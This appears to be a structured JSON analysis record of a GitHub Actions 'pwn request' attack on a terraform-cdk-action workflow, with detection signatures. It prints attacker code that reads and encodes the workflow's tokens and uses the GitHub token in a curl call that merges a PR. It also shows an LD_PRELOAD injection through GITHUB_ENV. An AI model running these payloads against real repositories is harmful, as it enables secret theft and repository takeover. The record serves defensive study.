@@ -1,0 +1,232 @@
+{
+  "package_info": {
+    "package_name": "terraform-cdk-action",
+    "package_manager": "GitHub Actions",
+    "package_versions": "N/A (vulnerable workflow configuration, not a versioned package)",
+    "why_malicious": "The repository's GitHub Actions workflow is misconfigured to allow attacker-controlled code from forked pull requests to execute with elevated privileges via the pull_request_target trigger. This misconfiguration enables attackers to inject arbitrary code, steal repository secrets, and perform privileged actions (such as merging PRs or modifying the repository) by exploiting the workflow's access to secrets and write permissions."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "pull_request_target",
+        "file_location": ".github/workflows/integration-tests.yml",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "environment_vars",
+          "GITHUB_TOKEN",
+          "secrets"
+        ]
+      },
+      "code_snippet": "- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n  with:\n    ref: ${{ github.event.pull_request.head.ref }}\n    repository: ${{ github.event.pull_request.head.repo.full_name }}",
+      "code_language": "yaml",
+      "code_behavior": "At workflow start (pull_request_target), the workflow checks out attacker-controlled code from a forked repository into the privileged base repository context, enabling untrusted code to run with access to secrets and write permissions.",
+      "malice_analysis": {
+        "why_suspicious": "Checking out code from a forked repository in a privileged workflow context allows untrusted code to execute with access to repository secrets and write permissions, creating a high risk of compromise.",
+        "violated_expectations": "Privileged workflows should only execute trusted code. Here, untrusted code from a fork is executed with elevated permissions, violating the principle of least privilege.",
+        "similar_legitimate_use": "Trusted contributors' code may be checked out for review, but not with secrets or write access in the context of untrusted PRs.",
+        "key_indicators": [
+          "actions/checkout with ref set to github.event.pull_request.head.ref in pull_request_target",
+          "repository set to github.event.pull_request.head.repo.full_name",
+          "workflow triggered by pull_request_target"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (after checkout, during dependency installation)",
+        "file_location": "test-stacks/package.json (in attacker PR)",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "{\n  \"scripts\": {\n    \"preinstall\": \"malicious command here\"\n  }\n}",
+      "code_language": "json",
+      "code_behavior": "During dependency installation, the npm install command executes the preinstall script defined in the attacker's package.json, allowing arbitrary code execution in the privileged workflow context.",
+      "malice_analysis": {
+        "why_suspicious": "The preinstall script is attacker-controlled and runs with the workflow's permissions, enabling arbitrary code execution and potential exfiltration of secrets or modification of the environment.",
+        "violated_expectations": "Dependency installation should not execute untrusted scripts with privileged permissions, especially in workflows with access to secrets.",
+        "similar_legitimate_use": "Legitimate packages may use preinstall for setup, but not in untrusted PRs or with access to sensitive secrets.",
+        "key_indicators": [
+          "arbitrary preinstall/postinstall scripts in package.json",
+          "npm install run in privileged context",
+          "preinstall script not audited or restricted"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (action execution)",
+        "file_location": "dist/index.js (compiled from index.ts in PR branch)",
+        "required_permissions": [
+          "network",
+          "environment_vars",
+          "GITHUB_TOKEN",
+          "secrets"
+        ]
+      },
+      "code_snippet": "import * as core from \"@actions/core\";\nimport { run } from \"./action\";\nimport { execSync } from 'child_process';\nconsole.log(\"\\r\\nPwned action...\");\nconsole.log(execSync('id').toString());\nconst tfToken = Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split(\"\").reverse().join(\"-\")).toString('base64');\nconst ghToken = Buffer.from(process.env.INPUT_GITHUBTOKEN || ''.split(\"\").reverse().join(\"-\")).toString('base64');\nconsole.log('Testing token...');\nconst str = `# Merge PR\ncurl -X PUT \\\n    https://api.github.com/repos/mousefluff/terraform-cdk-action/pulls/2/merge \\\n    -H \"Accept: application/vnd.github.v3+json\" \\\n    --header \"authorization: Bearer ${process.env.INPUT_GITHUBTOKEN}\" \\\n    --header 'content-type: application/json' \\\n    -d '{\"commit_title\":\"pwned\"}'`;\nexecSync(str, { stdio: 'inherit' });\nrun().catch((error) => {\n  core.setFailed(error.message);\n});",
+      "code_language": "typescript/javascript",
+      "code_behavior": "At action execution, the code accesses workflow secrets (INPUT_TERRAFORMCLOUDTOKEN, INPUT_GITHUBTOKEN), exfiltrates or manipulates them, and performs privileged API calls (such as merging PRs) and arbitrary shell command execution, all within the privileged workflow context.",
+      "malice_analysis": {
+        "why_suspicious": "The action is attacker-controlled and directly accesses secrets and performs privileged operations, such as merging PRs and exfiltrating tokens, which can lead to repository compromise.",
+        "violated_expectations": "Actions should not be replaced by untrusted code in privileged workflows, nor should they access or exfiltrate secrets without strict controls.",
+        "similar_legitimate_use": "Legitimate actions may use tokens for API calls, but only trusted, reviewed code should have this access.",
+        "key_indicators": [
+          "direct access to secrets/environment variables",
+          "arbitrary shell command execution via execSync",
+          "API calls using GITHUB_TOKEN to sensitive endpoints",
+          "modification or exfiltration of secrets"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (artifact consumption)",
+        "file_location": "download.yml (privileged workflow), pr.txt (artifact from untrusted workflow)",
+        "required_permissions": [
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "PR=$(cat ./pr.txt)\necho \"PR_NO=${PR}\" >> $GITHUB_ENV",
+      "code_language": "shell",
+      "code_behavior": "At artifact consumption, the workflow reads attacker-controlled data from pr.txt and injects it into the GITHUB_ENV, potentially setting environment variables like LD_PRELOAD to load malicious shared objects and execute arbitrary code in subsequent steps.",
+      "malice_analysis": {
+        "why_suspicious": "Untrusted artifact data is injected into the environment, enabling environment variable attacks (e.g., LD_PRELOAD) and arbitrary code execution in the privileged workflow.",
+        "violated_expectations": "Privileged workflows should not trust or directly use untrusted artifact data without validation or sanitization.",
+        "similar_legitimate_use": "Passing safe, validated data between trusted workflows is legitimate, but not direct injection of untrusted data.",
+        "key_indicators": [
+          "cat of untrusted file into environment variable",
+          "no sanitization or validation of artifact data",
+          "potential for LD_PRELOAD or other critical variable injection"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "runtime (environment variable injection)",
+        "file_location": "GITHUB_ENV (set by attacker via artifact or script)",
+        "required_permissions": [
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "echo \"LD_PRELOAD=$GITHUB_WORKSPACE/ldpreload-poc.so\" >> $GITHUB_ENV",
+      "code_language": "shell",
+      "code_behavior": "At runtime, the workflow sets LD_PRELOAD to a malicious shared object, causing the dynamic linker to load attacker code into all subsequent processes within the workflow environment.",
+      "malice_analysis": {
+        "why_suspicious": "LD_PRELOAD is a powerful vector for arbitrary code execution and is not restricted by GitHub Actions, allowing attackers to hijack process execution.",
+        "violated_expectations": "Workflows should not allow untrusted input to set critical environment variables like LD_PRELOAD, as this can subvert all subsequent steps.",
+        "similar_legitimate_use": "Rarely legitimate; LD_PRELOAD is typically used for debugging or instrumentation, not in CI/CD pipelines or production workflows.",
+        "key_indicators": [
+          "LD_PRELOAD set from untrusted input or artifact",
+          "shared object written to workspace and loaded via environment variable",
+          "modification of GITHUB_ENV with critical variables"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_6",
+      "execution_context": {
+        "trigger": "runtime (artifact creation and download)",
+        "file_location": "upload.yml (artifact creation), download.yml (artifact download)",
+        "required_permissions": [
+          "filesystem"
+        ]
+      },
+      "code_snippet": "actions/upload-artifact@v4\nactions/download-artifact@v4",
+      "code_language": "yaml",
+      "code_behavior": "During workflow execution, artifacts created from untrusted code are later downloaded and used in privileged workflows, enabling attacker-controlled data to influence privileged steps and potentially inject malicious payloads.",
+      "malice_analysis": {
+        "why_suspicious": "Artifacts from untrusted sources are used without validation, enabling data or code injection into privileged workflows and increasing the risk of compromise.",
+        "violated_expectations": "Privileged workflows should only consume trusted artifacts, and any data from untrusted sources must be validated and sanitized.",
+        "similar_legitimate_use": "Safe artifact passing between trusted workflows is legitimate, but not between untrusted and privileged contexts without validation.",
+        "key_indicators": [
+          "artifact upload/download between untrusted and privileged workflows",
+          "no validation or sanitization of artifact contents",
+          "use of actions/upload-artifact and actions/download-artifact in cross-workflow data flow"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker submits a pull request from a fork with malicious code (package.json, index.ts, or artifacts).",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Malicious code is checked out and prepared for execution in privileged context."
+    },
+    {
+      "step": 2,
+      "action": "Workflow installs dependencies, triggering preinstall script in attacker's package.json.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Arbitrary code execution in privileged workflow context."
+    },
+    {
+      "step": 3,
+      "action": "Malicious action code (index.ts/index.js) is executed, exfiltrating secrets and performing privileged API calls.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Secrets are stolen, and attacker can perform privileged operations (e.g., merging PRs)."
+    },
+    {
+      "step": 4,
+      "action": "Attacker crafts artifact (pr.txt) with payload (e.g., LD_PRELOAD) and uploads it.",
+      "implemented_by": [
+        "snippet_4"
+      ],
+      "leads_to": "Privileged workflow downloads and injects malicious environment variable."
+    },
+    {
+      "step": 5,
+      "action": "LD_PRELOAD is set to load attacker's shared object, enabling arbitrary code execution in all subsequent steps.",
+      "implemented_by": [
+        "snippet_5"
+      ],
+      "leads_to": "Full compromise of privileged workflow and potential lateral movement."
+    },
+    {
+      "step": 6,
+      "action": "Artifacts are passed between untrusted and privileged workflows without validation.",
+      "implemented_by": [
+        "snippet_6"
+      ],
+      "leads_to": "Attack chain is completed, enabling persistent or repeated exploitation."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Privileged workflow (pull_request_target or workflow_run) checks out code from forked repositories using github.event.pull_request.head.ref",
+      "Execution of preinstall/postinstall scripts from untrusted package.json files during dependency installation",
+      "Local actions (uses: ./) executed from PR branches in privileged workflows",
+      "Environment variables (e.g., LD_PRELOAD) set from untrusted artifact data or files",
+      "Artifacts from untrusted workflows consumed in privileged workflows without validation"
+    ],
+    "file_indicators": [
+      ".github/workflows/* with pull_request_target or workflow_run triggers",
+      "package.json with suspicious preinstall/postinstall scripts in PRs from forks",
+      "index.js or index.ts in action directories modified in PRs",
+      "Artifacts (e.g., pr.txt) containing environment variable payloads",
+      "GITHUB_ENV containing LD_PRELOAD or other critical variables set from artifacts"
+    ],
+    "network_indicators": [
+      "Outbound requests to api.github.com using GITHUB_TOKEN for privileged operations (e.g., merging PRs)",
+      "Unexpected external API calls or exfiltration endpoints in workflow logs",
+      "curl or similar commands in action or workflow steps targeting sensitive endpoints"
+    ],
+    "how_to_detect": "Monitor workflows for use of pull_request_target or workflow_run triggers that check out code from forked repositories or use untrusted refs. Flag workflows that execute preinstall/postinstall scripts from package.json or run local actions (uses: ./) from PR branches. Inspect artifact consumption in privileged workflows for unsanitized data injection into environment variables, especially LD_PRELOAD. Audit workflow logs for unexpected API calls or secrets access. Use static analysis to detect these patterns in workflow YAML and action source files, and validate artifact data before use in privileged contexts."
+  }
+}
